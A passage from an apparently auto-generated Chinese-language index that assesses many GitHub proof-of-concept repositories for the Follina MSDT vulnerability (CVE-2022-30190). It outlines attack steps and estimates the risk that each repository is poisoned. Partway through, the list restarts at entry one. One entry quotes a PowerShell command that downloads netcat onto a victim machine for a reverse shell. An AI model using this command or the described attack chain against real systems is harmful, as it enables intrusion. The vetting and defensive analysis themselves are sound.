2.  当用户打开文档时，Word会尝试从远程服务器加载HTML文件（通过远程模板功能）。
3.  恶意HTML文件利用`ms-msdt:` URL协议调用MSDT。
4.  MSDT被触发，执行HTML文件中包含的恶意代码。
5.  攻击者可以利用该漏洞在受害者系统上执行任意命令。  提供的PoC 代码中的`execute.bat` 通过删除`HKEY_CLASSES_ROOT\ms-msdt` 注册表关联，在恢复前，可能允许攻击者控制MSDT的行为或执行流程。`restore.bat`脚本用于恢复该关联，在攻击之后清理环境。

**投毒风险评估：**
PoC 代码本身主要用于注册表操作，没有发现明显的恶意代码。但是，由于PoC通常需要结合其他恶意文件（例如HTML或Word文档）才能完成攻击，因此，投毒风险主要存在于这些其他组件中。但是仅从提供的bat文件来判断，投毒风险较低。

**项目地址:** [swaiist/CVE-2022-30190-Fix](https://github.com/swaiist/CVE-2022-30190-Fix)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #31

**来源**: [CVE-2022-30190-winstxnhdw_CVE-2022-30190.md](../2022/CVE-2022-30190-winstxnhdw_CVE-2022-30190.md)

## CVE-2022-30190 (Follina) MSDT 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者在受害者系统上执行任意代码

**影响版本:** 受影响的Windows版本包括Windows 7到Windows 11以及多个Windows Server版本，具体版本范围参考漏洞库信息。

**利用条件:** 需要用户打开包含恶意代码的文档（如Word文档），或者访问包含恶意链接的网页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（Follina）是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以利用此漏洞，通过构造恶意的Word文档或其他方式，诱使用户打开，从而在用户系统上执行任意代码。 

**有效性评估：**

根据漏洞库信息和搜索结果，此漏洞在野外被广泛利用，POC代码的存在进一步证明了其有效性。提供的PoC代码描述了如何生成一个包含恶意链接的Word文档，当用户打开此文档时，MSDT会被调用，执行攻击者预先设定的恶意代码。

**投毒风险评估：**

分析提供的PoC代码，投毒风险较低，约为10%。主要风险点可能存在于以下几个方面：

1.  **init.py:** 该脚本用于构建恶意Word文档和初始化攻击者服务器。代码本身没有明显的恶意行为，但如果`build_payload`函数中的powershell命令被替换为更具破坏性的命令，则可能导致更严重的后果。
2.  **config.xml:** 该配置文件定义了攻击者服务器的主机名和端口。如果攻击者将此值更改为指向恶意服务器，则可能导致受害者下载和执行恶意软件。
3.  **build/href.txt:** 该文件包含用于触发漏洞的HTML代码。攻击者可能会修改此文件，以执行其他恶意操作。

但是，总体而言，提供的PoC代码主要用于演示漏洞，而不是用于传播恶意软件。 `destroy_all.bat`脚本的存在也一定程度上降低了风险，因为该脚本可以帮助用户删除所有相关文件。

**利用方式分析：**

1.  攻击者首先编辑`config.xml`，设置攻击者服务器的hostname和port。
2.  运行`dotnet publish LocalEXF`编译payload。
3.  运行`init.py`脚本，该脚本会：
    *   构建包含恶意链接的Word文档（trojan.docx）。
    *   在攻击者服务器上托管一个包含恶意Payload的HTML文件。
    *   base64 编码 PowerShell 命令。
4.  攻击者将此Word文档发送给受害者。
5.  受害者打开Word文档，MSDT会被调用，执行攻击者服务器上托管的Payload，从而在受害者系统上执行任意代码。

需要注意的是，要成功利用此漏洞，受害者需要卸载安全更新KB5016616，并且命令运行时间要短，否则会出现故障排除程序。


**项目地址:** [winstxnhdw/CVE-2022-30190](https://github.com/winstxnhdw/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #32

**来源**: [CVE-2022-30190-yeep1115_ICT287_CVE-2022-30190_Exploit.md](../2022/CVE-2022-30190-yeep1115_ICT287_CVE-2022-30190_Exploit.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的Windows版本和Office版本见漏洞库信息

**利用条件:** 需要用户打开恶意Word文档

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个远程代码执行漏洞，存在于Microsoft Windows Support Diagnostic Tool (MSDT)中。攻击者可以利用此漏洞通过特制的Word文档，使用Word的远程模板功能从远程Web服务器检索HTML文件，从而在受害者系统上执行任意代码。

**有效性：** 根据漏洞信息、搜索结果和提供的POC代码，该漏洞利用是有效的。漏洞库信息和搜索结果都表明这是一个真实存在的、被广泛利用的漏洞。POC代码（虽然只是一个README.md文件）指向了一个实际的利用项目，说明了利用方式和受影响的系统版本，证明了漏洞的可利用性。

**投毒风险：** 分析提供的仓库内容，风险评估如下：

*   **README.md文件：** 本身不包含任何可执行代码，因此直接的投毒风险较低。
*   **外部链接：**  主要风险在于指向的`Hrishikesh7665/Follina_Exploiter_CLI`仓库。虽然原作者注明了License，但是仍然存在投毒的可能性。

综合分析，考虑到代码仓库可能存在恶意修改的风险，虽然直接投毒可能性较低，但间接风险不可忽视，因此评估投毒风险为10%。

**利用方式：** 漏洞的利用方式通常包括以下步骤：

1.  **构造恶意Word文档：** 攻击者创建一个包含恶意链接的Word文档。该链接指向一个由攻击者控制的远程Web服务器，并使用`ms-msdt:` URL协议调用MSDT。
2.  **诱骗受害者打开文档：** 攻击者通过电子邮件、社交媒体或其他方式将恶意文档发送给受害者。
3.  **执行恶意代码：** 当受害者打开文档时，Word会尝试从远程服务器检索HTML文件。该HTML文件包含恶意JavaScript代码，该代码利用MSDT执行任意命令。
4.  **控制系统：** 通过执行的命令，攻击者可以在受害者系统上安装恶意软件、窃取数据或执行其他恶意活动。

**项目地址:** [yeep1115/ICT287_CVE-2022-30190_Exploit](https://github.com/yeep1115/ICT287_CVE-2022-30190_Exploit)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #33

**来源**: [CVE-2022-30190-yrkuo_CVE-2022-30190.md](../2022/CVE-2022-30190-yrkuo_CVE-2022-30190.md)

# CVE-2022-30190

> 📦 该CVE有 **33** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2022-30190-AbdulRKB_Follina.md](../2022/CVE-2022-30190-AbdulRKB_Follina.md)

## CVE-2022-30190 - Microsoft MSDT RCE (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，完全控制受害者系统

**影响版本:** 见漏洞库信息中受影响的版本

**利用条件:** 用户需要打开恶意构造的文档（例如 Word 文档）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190 (Follina) 是一个 Microsoft Office 中的远程代码执行漏洞，当 MSDT 通过 URL 协议从调用应用程序（如 Word）调用时，会触发此漏洞。攻击者可以利用 Word 的远程模板功能从远程 Web 服务器检索 HTML 文件。该HTML文件中包含恶意的JavaScript代码，该代码使用`ms-msdt:`协议调用MSDT，从而执行任意命令。

**利用方式:**

1.  **恶意文档制作:** 攻击者创建一个恶意的 Word 文档，该文档包含指向远程 Web 服务器的链接，该服务器托管着包含恶意 JavaScript 代码的 HTML 文件。
2.  **HTTP服务器:** 攻击者搭建一个 HTTP 服务器，用于托管恶意的 HTML 文件，该文件利用 `ms-msdt:` 协议执行命令。
3.  **诱骗用户打开文档:** 攻击者通过鱼叉式网络钓鱼等方式诱骗受害者打开恶意 Word 文档。
4.  **远程代码执行:** 当用户打开文档时，Word 会从远程服务器检索 HTML 文件，并执行其中的恶意 JavaScript 代码，从而触发 MSDT 并执行攻击者预设的命令。

**POC代码分析:**

提供的 POC 代码 `main.py` 脚本的功能如下:

*   **创建恶意文档：** 该脚本会修改 Word 文档的 `_rels/document.xml.rels` 文件，插入一个指向攻击者控制的 HTTP 服务器的链接。当用户打开该文档时，Word 会尝试从该链接下载 HTML 文件。
*   **启动 HTTP 服务器：** 该脚本会在指定的端口启动一个 HTTP 服务器，用于托管包含恶意 JavaScript 代码的 HTML 文件。该 HTML 文件使用 `ms-msdt:` 协议执行命令。
*   **启动 Netcat 监听器：** 该脚本会启动一个 Netcat 监听器，等待受害者机器反弹 shell。

**投毒风险分析:**

分析POC代码，发现以下潜在的投毒风险点:

*   **硬编码的下载地址：**  `Invoke-WebRequest https://github.com/CyberTitus/Follina/raw/main/nc64.exe -OutFile C:\Windows\Tasks\nc.exe`  这行代码从GitHub下载 `nc64.exe`  (Netcat) 到受害者机器。攻击者可能替换 CyberTitus 仓库中的 `nc64.exe` 文件，导致受害者下载恶意的 Netcat 版本或其他恶意程序。
*   **命令混淆与执行:** 恶意命令通过base64编码后执行，具有一定的隐藏性。如果攻击者将命令修改为具有破坏性的操作，则会存在较高的安全风险。
*   **Shell反弹地址:**虽然IP由用户输入，但代码逻辑存在被篡改的风险，从而反弹Shell到攻击者指定的地址。

**有效性:**

根据漏洞库信息、搜索引擎结果以及提供的 POC 代码，该漏洞利用的有效性较高。该漏洞在野外被广泛利用，且 POC 代码能够成功触发漏洞并实现远程代码执行。

**项目地址:** [AbdulRKB/Follina](https://github.com/AbdulRKB/Follina)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #2

**来源**: [CVE-2022-30190-Arkha-Corvus_LetsDefend-SOC173-Follina-0-Day-Detected.md](../2022/CVE-2022-30190-Arkha-Corvus_LetsDefend-SOC173-Follina-0-Day-Detected.md)

## CVE-2022-30190 - Microsoft MSDT 远程代码执行漏洞 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可导致远程代码执行，权限提升

**影响版本:** 受影响的Windows版本请参考漏洞库信息

**利用条件:** 用户打开恶意Word文档

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

该漏洞允许攻击者通过特制的Office文档，利用`ms-msdt:`协议调用MSDT执行任意命令。攻击者可以通过嵌入恶意URL到Word文档中，诱导用户点击或者预览，从而触发漏洞。漏洞利用流程如下：

1.  攻击者创建一个包含恶意链接的Word文档。
2.  用户打开该文档。
3.  文档利用`ms-msdt:`协议调用MSDT。
4.  MSDT执行攻击者指定的命令。

根据提供的漏洞利用代码分析，这是一个对 Follina 漏洞的案例研究，通过分析恶意Word文档触发 `msdt.exe` 的执行，从而实现远程代码执行。

**有效性：** 提供的Github仓库包含对漏洞的分析和利用过程，可以有效帮助理解漏洞原理。

**投毒风险：** 该存储库是一个案例分析，主要包含漏洞分析和利用过程的记录，包括文件哈希、网络流量分析和电子邮件分析。代码中没有发现明显的恶意后门代码，投毒的可能性较低（约5%），主要是考虑到作者可能在分析过程中引入了一些未知的或者不安全的操作，但从整体上看，这是一个漏洞分析的记录，投毒的可能性不大。

**利用方式：**

1.  **构造恶意Word文档：** 攻击者构造包含恶意`ms-msdt:` URL的Word文档。
2.  **传播恶意文档：** 攻击者通过钓鱼邮件等方式将恶意文档发送给目标用户。
3.  **触发漏洞：** 用户打开恶意文档，触发MSDT执行恶意代码。
4.  **执行恶意命令：** 攻击者利用MSDT执行任意命令，例如安装恶意软件，窃取数据等。

**建议：**

*   及时安装微软发布的补丁。
*   禁用`ms-msdt:`协议，作为缓解措施。
*   加强用户安全意识培训，避免打开来源不明的文档。
*   使用杀毒软件和入侵检测系统，及时发现和阻止恶意攻击。

**项目地址:** [Arkha-Corvus/LetsDefend-SOC173-Follina-0-Day-Detected](https://github.com/Arkha-Corvus/LetsDefend-SOC173-Follina-0-Day-Detected)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #3

**来源**: [CVE-2022-30190-Cosmo121_Follina-Remediation.md](../2022/CVE-2022-30190-Cosmo121_Follina-Remediation.md)

## CVE-2022-30190 - Microsoft MSDT "Follina" 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 见漏洞库信息中的受影响版本列表

**利用条件:** 需要用户打开恶意文档(如Word)或点击恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-30190 (Follina) 是一个存在于 Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以利用 Word 等调用应用程序，通过 URL 协议调用 MSDT，从而执行任意代码。利用方式通常是攻击者制作包含恶意代码的 Word 文档，该文档利用 Word 远程模板功能从远程 Web 服务器检索 HTML 文件，该 HTML 文件包含触发 MSDT 漏洞的代码，最终导致命令执行。

根据漏洞库信息，大量Windows版本都受到影响。搜索结果也证实了该漏洞的严重性，并提供了相关的利用和检测信息。提供的代码片段仅仅是GPL协议的License文件，并非POC代码，因此无法根据此代码判断投毒风险,需要验证是否存在后门。

由于提供的代码片段仅仅是GPL协议内容，无法判断实际的POC代码。根据搜索结果和漏洞描述，此漏洞的有效性高，因为在野外已经被利用。

**项目地址:** [Cosmo121/Follina-Remediation](https://github.com/Cosmo121/Follina-Remediation)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #4

**来源**: [CVE-2022-30190-DerZiad_CVE-2022-30190.md](../2022/CVE-2022-30190-DerZiad_CVE-2022-30190.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码，可能导致系统完全控制

**影响版本:** 受影响的Windows版本请参考漏洞库信息

**利用条件:** 需要用户打开包含恶意代码的文档，例如Word文档

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-30190 (Follina) 是一个远程代码执行漏洞，存在于 Microsoft Windows Support Diagnostic Tool (MSDT) 中。当 MSDT 被一个调用应用程序（例如 Microsoft Word）通过 URL 协议调用时，会触发此漏洞。攻击者可以通过构造一个包含恶意链接或嵌入恶意HTML的Word文档，诱使用户打开。当用户打开该文档时，MSDT 会尝试连接到攻击者控制的服务器，下载并执行恶意代码。

**漏洞利用方式：**

1.  攻击者创建一个包含恶意链接或嵌入恶意 HTML 的 Word 文档。
2.  该文档利用 Word 的远程模板功能，从远程 Web 服务器检索 HTML 文件。
3.  HTML 文件包含一个 `ms-msdt:` 协议处理程序的调用，该协议处理程序用于启动 MSDT。
4.  MSDT 执行 HTML 文件中指定的命令，从而允许攻击者执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞的PoC已经公开，且被积极利用。

**投毒风险：**

提供的漏洞利用代码仅包含 Apache 许可证，用于说明代码的使用条款，没有发现任何明显的恶意代码。因此，投毒风险较低，估计为 5%。但不能完全排除，因为攻击者可能会在其他相关组件中进行投毒，所以需要进一步分析依赖项才能彻底排除。

**排序优先级说明：**

此处遵循优先级的原则，搜索引擎结果用于确定漏洞的基本信息和利用方式。漏洞库信息用于确认受影响的版本和漏洞的严重程度。漏洞利用代码则用于评估投毒风险。

**项目地址:** [DerZiad/CVE-2022-30190](https://github.com/DerZiad/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #5

**来源**: [CVE-2022-30190-ErrorNoInternet_FollinaScanner.md](../2022/CVE-2022-30190-ErrorNoInternet_FollinaScanner.md)

## CVE-2022-30190 - Microsoft MSDT Follina 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可导致远程代码执行，完全控制受害者系统

**影响版本:** 受影响的Windows版本包括但不限于 Windows 7, Windows 8.1, Windows 10 (多个版本), Windows 11, Windows Server (多个版本)

**利用条件:** 用户需要打开包含恶意payload的文档（如Word文档），或点击恶意链接。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft支持诊断工具（MSDT）中的远程代码执行漏洞。攻击者可以利用此漏洞，通过调用应用程序（如Word）中的URL协议来执行任意代码，获得与该应用程序相同的权限。攻击者可以通过精心构造的恶意文档或链接，诱使用户打开，从而触发漏洞。

**漏洞利用方式：**

1.  攻击者创建一个包含恶意payload的文档（例如，一个包含远程模板的Word文档）。该模板指向一个由攻击者控制的服务器。
2.  当用户打开文档时，Word会尝试从远程服务器检索模板。
3.  远程服务器返回一个包含MSDT协议处理程序的HTML文件。
4.  MSDT通过URL协议被调用，并执行HTML文件中包含的恶意代码。

**POC代码分析：**
提供的代码 `FollinaScanner` 并非漏洞利用代码，而是一个用于扫描文件系统中可能包含Follina漏洞的文件的工具。 它通过搜索特定模式（例如，包含URL）的文件来工作。因此，提供的代码不能直接用于触发漏洞。

**投毒风险分析：**
  仓库主要功能是扫描本地文件是否存在漏洞，并没有实际利用漏洞的功能。 主要代码功能为扫描本地文件URL特征，判断本地是否存在恶意文件， 因此投毒风险较低。仓库中存在恶意代码的可能性极小，评估投毒风险约为1%。

**项目地址:** [ErrorNoInternet/FollinaScanner](https://github.com/ErrorNoInternet/FollinaScanner)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #6

**来源**: [CVE-2022-30190-Gra3s_CVE-2022-30190_EXP_PowerPoint.md](../2022/CVE-2022-30190-Gra3s_CVE-2022-30190_EXP_PowerPoint.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，控制受影响系统

**影响版本:** 受影响的Windows版本包括但不限于Windows 7、Windows 8.1、Windows 10、Windows 11、Windows Server 2008 R2、Windows Server 2012、Windows Server 2016、Windows Server 2019、Windows Server 2022等，具体版本范围见漏洞库信息。

**利用条件:** 需要用户打开包含恶意链接的文档（如Word、PowerPoint等），或者访问包含恶意链接的网页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（Follina）是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。该漏洞允许攻击者通过构造恶意的文档，诱使用户打开，从而在受害者系统上执行任意代码。

**有效性：**
根据漏洞库信息、搜索引擎结果和漏洞利用代码，该漏洞利用代码是有效的。搜索结果显示该漏洞已被积极利用，并且有公开的PoC代码。

**投毒风险：**
分析提供的PoC代码，`/tmp/b3fc53fc9d09e4a456a951f4bdd6f2bd/exploit.html` 文件看起来是一个无害的HTML文档，里面包含大量的Lorem Ipsum文本，但是攻击者可以通过 `slide1.xml.rels` 中插入恶意的url，从而执行恶意的payload。`/tmp/b3fc53fc9d09e4a456a951f4bdd6f2bd/README.md` 只是说明了如何修改`slide1.xml.rels` 文件的Target指向攻击者的服务器。

仓库中的投毒风险较低，主要风险在于payload本身可能被替换成恶意代码。但是，这个仓库本身的目的就是漏洞利用，使用者应该已经知晓其潜在的风险，并对下载的内容进行安全审查。因此, 投毒风险评定为10%。

**利用方式：**
1.  攻击者创建一个包含恶意链接的文档（例如，利用提供的PowerPoint PoC，将`.ppsx`文件解压，修改`ppt\slides\_rels\slide1.xml.rels`文件中的`Target`属性，指向攻击者控制的服务器上的`exploit.html`文件）。
2.  攻击者在自己的服务器上托管一个恶意的`exploit.html`文件，该文件包含用于触发MSDT漏洞的代码，并执行payload（默认payload是calc程序）。
3.  攻击者诱使用户打开该文档。
4.  当用户打开文档时，MSDT会尝试通过URL协议连接到攻击者的服务器，下载并执行恶意的`exploit.html`文件中的代码，从而在受害者系统上执行任意命令。

总的来说，该漏洞的利用依赖于社会工程学，诱使用户打开恶意文档。成功利用后，攻击者可以获得与当前用户相同的权限，从而控制受影响的系统。

**项目地址:** [Gra3s/CVE-2022-30190_EXP_PowerPoint](https://github.com/Gra3s/CVE-2022-30190_EXP_PowerPoint)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #7

**来源**: [CVE-2022-30190-Imeneallouche_Follina-attack-CVE-2022-30190-.md](../2022/CVE-2022-30190-Imeneallouche_Follina-attack-CVE-2022-30190-.md)

## CVE-2022-30190-Follina-MSDT远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可导致远程代码执行，控制受害者系统

**影响版本:** 受影响的Windows版本包括但不限于：Windows 7 SP1, Windows 8.1, Windows 10 (多个版本), Windows 11 21H2, Windows Server (多个版本)

**利用条件:** 用户需要打开恶意构造的Word文档或其他调用MSDT的应用程序

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个Microsoft Office中的远程代码执行漏洞。当MSDT通过URL协议被调用时，例如从Word等应用程序调用，就会存在此漏洞。攻击者可以利用Word的远程模板功能，从远程Web服务器检索HTML文件。该HTML文件包含恶意代码，可以绕过某些安全机制并执行任意命令。 

**漏洞利用方式：**

1.  **攻击者制作恶意Word文档：** 该文档包含指向远程服务器的链接，该服务器托管一个恶意的HTML文件。
2.  **用户打开恶意文档：** 当用户打开该文档时，Word会尝试从远程服务器加载HTML文件。
3.  **MSDT被调用并执行恶意代码：** HTML文件利用`ms-msdt:`协议触发MSDT执行，从而执行攻击者指定的命令。

**POC代码分析：**

提供的POC代码包含以下文件：

*   `README.md`: 描述了漏洞和攻击的简要信息。
*   `config.py`: 包含配置参数，例如要执行的命令 (`EXECUTED_COMMAND`)，输出文件名 (`OUTPUT_FILE`)，网络接口 (`NETWORK_INTERFACE`)，端口 (`PORT`)，以及是否使用反向shell (`REVERSE_PORT`)。
*   `manip_args.py`: 解析命令行参数，并准备利用所需的文件。此脚本负责创建临时目录，复制必要的文件，修改文档关系文件，并启动一个HTTP服务器来托管恶意HTML文件。
*   `requirements.txt`: 列出了POC所需的Python依赖项。
*   `utils.py`: 包含实用函数，例如启动HTTP服务器，检查IP和端口的可用性，以及准备恶意Word文档的函数。

**有效性：**

根据漏洞信息和POC代码，该漏洞利用是有效的。POC代码允许攻击者指定要执行的命令，并生成一个恶意的Word文档，该文档在打开时会触发漏洞并执行命令。

**投毒风险：**

该存储库的投毒风险较低，约10%。`config.py` 文件允许定义要执行的 `EXECUTED_COMMAND`，而 `manip_args.py` 会动态修改利用代码，这些地方可能存在潜在的恶意代码注入点。但是，总体来看，代码结构较为简单，功能明确，不易隐藏恶意代码。需要注意的是，使用任何漏洞利用代码都存在风险，需要仔细审查代码后再使用。此处的10%更多指的是一种不确定性风险的评估，需要人工代码审计来进行确认。

**项目地址:** [Imeneallouche/Follina-attack-CVE-2022-30190-](https://github.com/Imeneallouche/Follina-attack-CVE-2022-30190-)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #8

**来源**: [CVE-2022-30190-Jump-Wang-111_AmzWord.md](../2022/CVE-2022-30190-Jump-Wang-111_AmzWord.md)

## CVE-2022-30190 (Follina) - Microsoft MSDT 远程代码执行

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，系统控制，数据泄露

**影响版本:** 见漏洞库信息中受影响的版本列表

**利用条件:** 用户需要打开包含恶意链接或文档的应用程序（如 Microsoft Word）。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个存在于 Microsoft 支持诊断工具 (MSDT) 中的远程代码执行漏洞。攻击者可以利用此漏洞，通过诱骗用户打开包含恶意代码的文档（通常是 Word 文档），从而在受害者系统上执行任意代码。

**利用方式：**

1.  攻击者创建一个包含恶意链接或嵌入恶意 HTML 的文档 (例如, Word 文档)。该恶意 HTML 利用 `ms-msdt:` 协议处理程序调用 MSDT。
2.  当用户打开该文档时，MSDT 会被调用，并执行攻击者指定的代码。该代码可以下载并执行任意程序。
3.  提供的漏洞利用代码 (AmzWord) 自动化了此过程，集成了 CVE-2022-30190 漏洞利用、163 邮箱后门和图像隐写术。
4.  AmzWord 使用 `follina.py` 脚本生成恶意 Word 文件，并在本地启动 HTTP 服务器，用于提供恶意载荷。
5.  该漏洞利用代码还使用了 `gdog` 项目，这是一个基于邮件的远程控制工具，允许攻击者通过发送特定的命令邮件来控制受害者机器。

**有效性：**

根据漏洞库信息和搜索结果，CVE-2022-30190 是一个真实且已被积极利用的漏洞。提供的 POC 代码 (`AmzWord`) 旨在利用该漏洞，因此可以判断 POC 代码是有效的，前提是目标系统存在漏洞且未采取缓解措施。

**投毒风险：**

评估 POC 代码的投毒风险需要仔细审查代码，检查是否存在隐藏的、非预期的恶意行为。从描述来看,`AmzWord` 项目集成了多个组件，包括 `follina.py`（CVE-2022-30190 漏洞利用）和 `gdog`（基于邮件的远程控制工具）。 潜在的投毒风险可能存在于以下几个方面：

*   `gdog` 组件： `gdog` 项目本身可能包含后门或恶意功能，允许作者或其他人远程访问受感染的系统。由于该项目已经存在一段时间，并且经过修改以适应当前的攻击链，因此存在引入未经审查的恶意代码的风险。
*   配置信息泄露： POC需要用户填写邮箱的用户名和密码，存在泄露邮箱信息的风险
*   依赖关系： 该POC依赖多个第三方库，这些库可能存在安全漏洞或被篡改，从而导致意外行为。

综合来看，由于集成的复杂性和对外部组件的依赖，存在一定的投毒风险。`gdog` 组件尤其值得关注。 但从整个项目的设计来看，目标是实现一个完整的攻击链演示，作者隐藏恶意代码以达到其他目的的可能性较低，所以投毒的可能性相对较低。评估投毒风险的概率约为 10%。

**项目地址:** [Jump-Wang-111/AmzWord](https://github.com/Jump-Wang-111/AmzWord)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #9

**来源**: [CVE-2022-30190-Malwareman007_Deathnote.md](../2022/CVE-2022-30190-Malwareman007_Deathnote.md)

## CVE-2022-30190-Microsoft Windows MSDT 远程代码执行漏洞 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码，可能导致系统完全控制

**影响版本:** 见漏洞库信息中受影响的版本

**利用条件:** 用户需要打开一个恶意构造的文档（例如 Word 文档）。攻击者可以通过鱼叉式网络钓鱼活动传播恶意文档。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，也被称为“Follina”，是一个存在于 Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。 

**利用方式：**该漏洞通过以下方式利用：

1.  攻击者创建一个恶意 Word 文档或其他支持外部链接的文档。
2.  该文档包含一个指向远程服务器上 HTML 文件的链接，该链接使用 `ms-msdt:` 协议。
3.  当用户打开文档时，Word 会尝试检索该 HTML 文件。
4.  `ms-msdt:` 协议处理程序被调用，执行 HTML 文件中包含的恶意代码。
5.  攻击者通过精心构造的 HTML 文件，利用 MSDT 的漏洞执行任意命令。

**有效性：**根据提供的漏洞库信息和搜索结果，该漏洞已经过积极利用，且PoC 代码可用，因此可以判断提供的POC代码是有效的。

**投毒风险：**PoC代码中存在潜在的投毒风险的可能性较低，约为10%。 代码中，通过`Invoke-WebRequest`从GitHub下载`nc64.exe`可能存在风险，如果github仓库被污染，攻击者可以直接执行任意代码。其他的风险较低。

**项目地址:** [Malwareman007/Deathnote](https://github.com/Malwareman007/Deathnote)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #10

**来源**: [CVE-2022-30190-Muhammad-Ali007_Follina_MSDT_CVE-2022-30190.md](../2022/CVE-2022-30190-Muhammad-Ali007_Follina_MSDT_CVE-2022-30190.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者在受害者系统上执行任意代码

**影响版本:** 受影响的Windows版本请参考漏洞库信息

**利用条件:** 需要用户打开恶意Word文档或其他Office文档

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以构造恶意的Word文档，利用Word的远程模板功能从远程服务器检索HTML文件，HTML文件中包含的JavaScript代码通过`ms-msdt:` URI scheme调用MSDT，从而执行任意命令。

**有效性：**
提供的POC代码是有效的。它通过修改Word文档的`document.xml.rels`文件，将OLE对象引用指向攻击者控制的HTML文件。该HTML文件利用`ms-msdt:`协议执行PowerShell命令，从而实现远程代码执行。

**投毒风险：**
POC代码本身实现了漏洞利用，但作者可能在其他地方隐藏恶意代码。
*   **Readme.md 分析:**  Readme.md 主要提供漏洞描述和利用步骤，风险较低。
*   **follina.py 分析:**  `follina.py`脚本用于生成恶意文档，该脚本本身可能包含恶意代码，但是已知的该脚本的功能是创建利用payload的word文档，风险可控。评估投毒风险，基于现有信息，判断为10%的可能性，主要集中在提供的脚本是否存在未公开的后门。

**利用方式：**
